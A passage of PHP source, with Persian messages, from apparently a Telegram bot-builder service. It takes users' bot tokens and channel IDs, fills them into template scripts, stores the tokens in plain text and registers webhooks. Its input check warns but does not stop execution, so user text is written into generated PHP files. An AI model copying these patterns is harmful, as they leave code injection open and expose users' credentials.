$all = explode("\n", $Cop);	

$file = fopen("dataPaMicK/$chat_id/Cop.txt", "a");
fwrite($file, "\n$text");
fclose($file);
file_put_contents("dataPaMicK/$from_id/state.txt","proxysk");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"از منو انتخاب کن",
'parse_mode'=>'Markdown', 
]);
}}

elseif($bloxk !== "ok" && $state == "proxysk" and $text != 'بازگشت ↪️'){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
"
]);


if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/Proxy/proxy.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/proxy.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","proxy");
file_put_contents("dataPaMicK/bot/$un/proxy.php",$upcr);
file_put_contents("PaMicKCreaT/$un/proxy.php",$class);
file_put_contents("dataPaMicK/bot/$un/channel.txt",$all[0]);

file_get_contents("https://api.pamickweb.ir/API/cron-job.php?url=https://pamickweb.ir/PaMicK/PaMicKCreaT/[BOT]/PaMicKCreaT/$un/proxy.php&time=1");

$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖

بعد از ساخت ربات حتما ربات رو ادمین چنلتون کنید
ربات خودکار داخل چنل پروکسی میزاره نیازی به استارت ربات نیست!
",
'parse_mode'=>'html',
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 🌐 | پروکسی گذار

ایدی ربات : @$un 🤖

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 35;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "👾 | ضدلینک - مدیریت گروه"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 35){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","zedlink");
 bot('sendMessage',[
         'chat_id'=>$chat_id,
         'text'=>"
لطفا ایدی چنل خودتون را بدون @ برای ما ارسال کنید 🔰
",
        'parse_mode'=>'HTML',
        'reply_markup'=>json_encode([
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ],
        'resize_keyboard'=>true
        ])
        ]);
        }else{
bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
جهت ساخت این ربات به 35 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
        ",
        'parse_mode'=>'HTML',
        ]);
                }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "zedlink" && $text !="بازگشت ↪️" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
       file_put_contents("dataPaMicK/$chat_id/Cop.txt",$text);
        file_put_contents("dataPaMicK/$from_id/state.txt","zedlinkk");
bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"$texttokeen",
        'parse_mode'=>'Markdown', 
        'reply_markup'=>json_encode([ 
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ]
        ])
        ]);
}
elseif($bloxk !== "ok" && $state == "zedlinkk" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
"
]);

if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/zedlink/index.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $un, $class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/index.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","zedlink");
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/index.php",$class);
file_put_contents("dataPaMicK/bot/$un/channel.txt",$all[0]);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور پنل مدیریت وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/index.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 👾 | ضدلینک - مدیریت گروه

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 35;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}


elseif($text1 == "📬 | پیام رسان"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 15){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","Payam");
 bot('sendMessage',[
         'chat_id'=>$chat_id,
         'text'=>"
لطفا ایدی چنل خودتون را بدون @ برای ما ارسال کنید 🔰
",
        'parse_mode'=>'HTML',
        'reply_markup'=>json_encode([
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ],
        'resize_keyboard'=>true
        ])
        ]);
        }else{
bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
جهت ساخت این ربات به 15 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
        ",
        'parse_mode'=>'HTML',
        ]);
                }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
        elseif($bloxk !== "ok" && $state == "Payam" && $text !="بازگشت ↪️" ){
        if($text[0] == '@')$text = substr($text, 1);
        if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
        bot('sendmessage',[
        'chat_id' => $chat_id,
        'text' => "
        باشه فهمیدیم 😒
        ",
        ]);
        }
        file_put_contents("dataPaMicK/$chat_id/Cop.txt",$text);
        file_put_contents("dataPaMicK/$from_id/state.txt","Payamk");
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"$texttokeen",
        'parse_mode'=>'Markdown', 
        'reply_markup'=>json_encode([ 
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ]
        ])
        ]);
        }

elseif($bloxk !== "ok" && $state == "Payamk" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);

if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/Payam/indexpa.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[BOTIDDD]",$un,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","Payam");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/indexpa.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد ??
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 📬 | پیام رسان

ایدی ربات : @$un 🤖

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 15;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}


elseif($text1 == "👁‍🗨 | ویوگیر"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 30){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","ViewGir");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen
",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 30 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
        }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "ViewGir" and $text != '🔙 | بازگشت‌'){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
"]);
if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/melat");
mkdir("PaMicKCreaT/$un/orderseen");
mkdir("PaMicKCreaT/$un/ads");
mkdir("PaMicKCreaT/$un/lib");
mkdir("PaMicKCreaT/$un/photos");
mkdir("PaMicKCreaT/$un/lib/Button");
mkdir("PaMicKCreaT/$un/lib/codes");
mkdir("PaMicKCreaT/$un/lib/photos");
mkdir("PaMicKCreaT/$un/lib/spam");
mkdir("PaMicKCreaT/$un/lib/kodam");
copy("source/MemberGir/lib/Button/dokc0.txt","PaMicKCreaT/$un/lib/Button/dokc0.txt");
copy("source/MemberGir/lib/Button/dokc2.txt","PaMicKCreaT/$un/lib/Button/dokc2.txt");
copy("source/MemberGir/lib/kodam/data-ads.json","PaMicKCreaT/$un/lib/kodam/data-ads.json");
copy("source/MemberGir/lib/kodam/data-Cancellads.json","PaMicKCreaT/$un/lib/kodam/data-Cancellads.json");
copy("source/MemberGir/lib/kodam/data-left.json","PaMicKCreaT/$un/lib/kodam/data-left.json");
copy("source/MemberGir/lib/kodam/data-power.json","PaMicKCreaT/$un/lib/kodam/data-power.json");
copy("source/MemberGir/lib/kodam/data-transfer.json","PaMicKCreaT/$un/lib/kodam/data-transfer.json");
copy("source/MemberGir/lib/kodam/data-zirmjmae.json","PaMicKCreaT/$un/lib/kodam/data-zirmjmae.json");
copy("source/MemberGir/lib/kodam/data.json","PaMicKCreaT/$un/lib/kodam/data.json");
copy("source/MemberGir/lib/kodam/list.json","PaMicKCreaT/$un/lib/kodam/list.json");
mkdir("PaMicKCreaT/$un/lib/keyboard");
mkdir("PaMicKCreaT/$un/lib/keyboard/home");
copy("source/ViewGir/lib/keyboard/home","PaMicKCreaT/$un/lib/keyboard/home");
copy("source/ViewGir/lib/keyboard/home/line11.txt","PaMicKCreaT/$un/lib/keyboard/home/line11.txt");
copy("source/ViewGir/lib/keyboard/home/line12.txt","PaMicKCreaT/$un/lib/keyboard/home/line12.txt");
copy("source/ViewGir/lib/keyboard/home/line13.txt","PaMicKCreaT/$un/lib/keyboard/home/line13.txt");
copy("source/ViewGir/lib/keyboard/home/line14.txt","PaMicKCreaT/$un/lib/keyboard/home/line14.txt");
copy("source/ViewGir/lib/keyboard/home/line21.txt","PaMicKCreaT/$un/lib/keyboard/home/line21.txt");
copy("source/ViewGir/lib/keyboard/home/line22.txt","PaMicKCreaT/$un/lib/keyboard/home/line22.txt");
copy("source/ViewGir/lib/keyboard/home/line23.txt","PaMicKCreaT/$un/lib/keyboard/home/line23.txt");
copy("source/ViewGir/lib/keyboard/home/line24.txt","PaMicKCreaT/$un/lib/keyboard/home/line24.txt");
copy("source/ViewGir/lib/keyboard/home/line31.txt","PaMicKCreaT/$un/lib/keyboard/home/line31.txt");
copy("source/ViewGir/lib/keyboard/home/line32.txt","PaMicKCreaT/$un/lib/keyboard/home/line32.txt");
copy("source/ViewGir/lib/keyboard/home/line33.txt","PaMicKCreaT/$un/lib/keyboard/home/line33.txt");
copy("source/ViewGir/lib/keyboard/home/line34.txt","PaMicKCreaT/$un/lib/keyboard/home/line34.txt");
copy("source/ViewGir/lib/keyboard/home/line41.txt","PaMicKCreaT/$un/lib/keyboard/home/line41.txt");
copy("source/ViewGir/lib/keyboard/home/line42.txt","PaMicKCreaT/$un/lib/keyboard/home/line42.txt");
copy("source/ViewGir/lib/keyboard/home/line43.txt","PaMicKCreaT/$un/lib/keyboard/home/line43.txt");
copy("source/ViewGir/lib/keyboard/home/line44.txt","PaMicKCreaT/$un/lib/keyboard/home/line44.txt");
copy("source/ViewGir/lib/keyboard/home/line51.txt","PaMicKCreaT/$un/lib/keyboard/home/line51.txt");
copy("source/ViewGir/lib/keyboard/home/line52.txt","PaMicKCreaT/$un/lib/keyboard/home/line52.txt");
copy("source/ViewGir/lib/keyboard/home/line53.txt","PaMicKCreaT/$un/lib/keyboard/home/line53.txt");
copy("source/ViewGir/lib/keyboard/home/line54.txt","PaMicKCreaT/$un/lib/keyboard/home/line54.txt");
copy("source/ViewGir/lib/keyboard/home/line61.txt","PaMicKCreaT/$un/lib/keyboard/home/line61.txt");
copy("source/ViewGir/lib/keyboard/home/line62.txt","PaMicKCreaT/$un/lib/keyboard/home/line62.txt");
copy("source/ViewGir/lib/keyboard/home/line63.txt","PaMicKCreaT/$un/lib/keyboard/home/line63.txt");
copy("source/ViewGir/lib/keyboard/home/line64.txt","PaMicKCreaT/$un/lib/keyboard/home/line64.txt");
copy("source/ViewGir/lib/keyboard/home/line71.txt","PaMicKCreaT/$un/lib/keyboard/home/line71.txt");
copy("source/ViewGir/lib/keyboard/home/line72.txt","PaMicKCreaT/$un/lib/keyboard/home/line72.txt");
copy("source/ViewGir/lib/keyboard/home/line73.txt","PaMicKCreaT/$un/lib/keyboard/home/line73.txt");
copy("source/ViewGir/lib/keyboard/home/line74.txt","PaMicKCreaT/$un/lib/keyboard/home/line74.txt");
copy("source/ViewGir/lib/keyboard/home/line81.txt","PaMicKCreaT/$un/lib/keyboard/home/line81.txt");
copy("source/ViewGir/lib/keyboard/home/line82.txt","PaMicKCreaT/$un/lib/keyboard/home/line82.txt");
copy("source/ViewGir/lib/keyboard/home/line83.txt","PaMicKCreaT/$un/lib/keyboard/home/line83.txt");
copy("source/ViewGir/lib/keyboard/home/line84.txt","PaMicKCreaT/$un/lib/keyboard/home/line84.txt");

copy("source/ViewGir/lib/keyboard","PaMicKCreaT/$un/lib/keyboard");
copy("source/ViewGir/lib/kodam","PaMicKCreaT/$un/lib/kodam");
copy("source/ViewGir/lib/keyboard/home/channelkey.txt","PaMicKCreaT/$un/lib/keyboard/home/channelkey.txt");
copy("source/ViewGir/lib/class.php","PaMicKCreaT/$un/lib/class.php");
copy("source/ViewGir/lib/jdf.php","PaMicKCreaT/$un/lib/jdf.php");
copy("source/ViewGir/melat.json","PaMicKCreaT/$un/melat.json");
copy("source/ViewGir/bot.php","PaMicKCreaT/$un/bot.php");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$class = file_get_contents("source/ViewGir/config.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $un, $class);
$class = str_replace("[*[IDBOOT]*]",$idbots,$class);
file_put_contents("PaMicKCreaT/$un/config.php",$class);
$bakfjd = file_get_contents("source/ViewGir/lib/kodam/list.json");
$bakfjd = str_replace("[ADMIIIN]",$from_id,$bakfjd);
